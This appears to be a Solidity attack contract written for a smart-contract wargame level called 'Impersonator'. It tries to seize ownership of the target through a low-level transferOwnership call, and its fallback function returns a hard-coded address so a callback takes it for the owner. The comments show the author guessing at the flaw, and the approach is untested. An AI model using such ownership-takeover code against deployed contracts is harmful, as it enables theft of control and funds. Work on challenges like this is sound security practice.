// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract OwnershipExploit {
    address constant IMPERSONATOR = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be;
    
    // Maybe the vulnerability is in msg.sender spoofing
    // The contract name "Impersonator" suggests we can impersonate someone
    
    function exploit() external {
        // Try to exploit via low-level call
        (bool success, ) = IMPERSONATOR.call(
            abi.encodeWithSignature("transferOwnership(address)", msg.sender)
        );
        require(success, "Transfer failed");
    }
    
    // Fallback to receive any calls
    fallback() external payable {
        // If the contract calls us back, pretend to be the owner
        assembly {
            let owner := 0x5FbDB2315678afecb367f032d93F642f64180aa3
            mstore(0x00, owner)
            return(0x00, 0x20)
        }
    }
}